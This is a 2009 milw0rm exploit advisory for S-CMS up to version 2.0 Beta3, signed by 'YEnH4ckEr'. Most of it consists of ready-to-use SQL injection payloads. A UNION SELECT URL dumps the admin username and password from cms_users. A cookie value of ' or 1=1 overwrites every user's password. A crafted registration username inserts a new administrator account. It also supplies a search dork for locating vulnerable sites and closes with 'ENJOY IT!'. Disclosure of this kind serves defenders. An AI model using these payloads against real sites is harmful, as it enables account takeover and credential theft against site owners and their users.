<html><head><title>S-CMS <= 2.0b3 Multiple SQL Injection Vulnerabilities</title></head><pre>***********************************************************************************************
***********************************************************************************************
**	       										     **
**  											     **
**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
** [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
**							                                     **
**    											     **
**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
**					¡PROUD TO BE SPANISH!				     **
**											     **
***********************************************************************************************
***********************************************************************************************

----------------------------------------------------------------------------------------------
|       	   	     MULTIPLE SQL INJECTION VULNERABILITIES	             	     |
|--------------------------------------------------------------------------------------------|
|                                    |    S-CMS &lt;= v-2.0 Beta3   |		    	     |
|  CMS INFORMATION:          	      ---------------------------	               	     |
|										             |
|--&gt;WEB: http://www.matteoiammarrone.com/public/s-cms/			       		     |
|--&gt;DOWNLOAD: http://www.matteoiammarrone.com/public/s-cms/		                     |
|--&gt;DEMO: N/A										     |
|--&gt;CATEGORY: CMS / Portal								     |
|--&gt;DESCRIPTION: Cms written in php and mysql, phpnuke style whit a plugins,                 |
|		blocks and permission system.                            		     |
|--&gt;RELEASED: 2009-05-25								     |
|											     |
|  CMS VULNERABILITY:									     |
|											     |
|--&gt;TESTED ON: firefox 3						                     |
|--&gt;DORK: &quot;S-CMS by matteoiamma&quot;						             |
|--&gt;CATEGORY: SQL INJECTION/INSECURE COOKIE HANDLING (SQLi)/ADD NEW ADMIN (SQLi)             |
|--&gt;AFFECT VERSION: &lt;= 2.0-Beta3					 		     |
|--&gt;Discovered Bug date: 2009-05-25							     |
|--&gt;Reported Bug date: 2009-05-25							     |
|--&gt;Fixed bug date: 2009-05-28								     |
|--&gt;Info patch(2.1): http://www.matteoiammarrone.com/public/s-cms/plugin.php?page=phpbb3     |
|--&gt;Author: YEnH4ckEr									     |
|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
|--&gt;WEB/BLOG: N/A									     |
|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
----------------------------------------------------------------------------------------------


#########################
////////////////////////

SQL INJECTION (SQLi):

////////////////////////
#########################


-------------------
PROOF OF CONCEPT:
-------------------


&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: magic quotes=OFF +++++++++++++++++---------&gt;&gt;&gt;&gt;

&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: {db_prefix} by default: cms +++++++++++++++++---------&gt;&gt;&gt;&gt;


[++] GET var --&gt; 'username'

[++] File vuln --&gt; 'profile.php'


~~~&gt; http://[HOST]/[PATH]/plugin.php?page=your_account&amp;mode=viewprofile&amp;username=-1%27+UNION+ALL+SELECT+1,user(),3,version(),database(),user(),7,8,current_user(),10,11,version(),13,14,15,version(),17,version(),user(),20,21,22%23


[++[Return]++] ~~~~~&gt; user or version in DB.


----------
EXPLOIT:
----------


~~~&gt; http://[HOST]/[PATH]/plugin.php?page=your_account&amp;mode=viewprofile&amp;username=-1%27+UNION+ALL+SELECT+1,username,3,concat(username,0x3A3A3A,password),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22+FROM+cms_users+WHERE+uid=1%23


[++[Return]++] ~~~~~&gt; username:::password in '{db_prefix}_users' table



##################################
/////////////////////////////////

INSECURE COOKIE HANDLING (SQLi):

/////////////////////////////////
##################################



&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: magic quotes=OFF +++++++++++++++++---------&gt;&gt;&gt;&gt;

&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: Be registered user +++++++++++++++++---------&gt;&gt;&gt;&gt;


Being other user we can change passwords of all users and set our password for them.


----------
EXPLOIT:
----------


Change 'username' cookie.


~~~&gt; username=[your_real_user]' or 1=1%23 



[++[Return]++] ~~~~~&gt; Set our password for all users.



#######################
//////////////////////

ADD NEW ADMIN (SQLi):

/////////////////////
######################



&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: magic quotes=OFF +++++++++++++++++---------&gt;&gt;&gt;&gt;



Go to register page ~~~~~&gt; http://[HOST]/[PATH]/plugin.php?page=your_account.php&amp;mode=register


----------
EXPLOIT:
----------


Set username.


~~~&gt; username=y3nh4ck3r',MD5('y3nh4ck3r'), '', '', '', '', 'offline', 'y3nh4ck3r@gmail.com', '01.gif', '', '', '', '1', '', '', 'ip', 'lang-english.php', 'lightstorm', '', 'admin', '0')/*



[++[Return]++] ~~~~~&gt; Create new admin with username/password= y3nh4ck3r/y3nh4ck3r



&lt;&lt;&lt;-----------------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!



##############################################################################
##############################################################################
##**************************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
##**************************************************************************##
##--------------------------------------------------------------------------##
##**************************************************************************##
## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
##**************************************************************************##
##############################################################################
##############################################################################

# milw0rm.com [2009-06-09]</pre></html>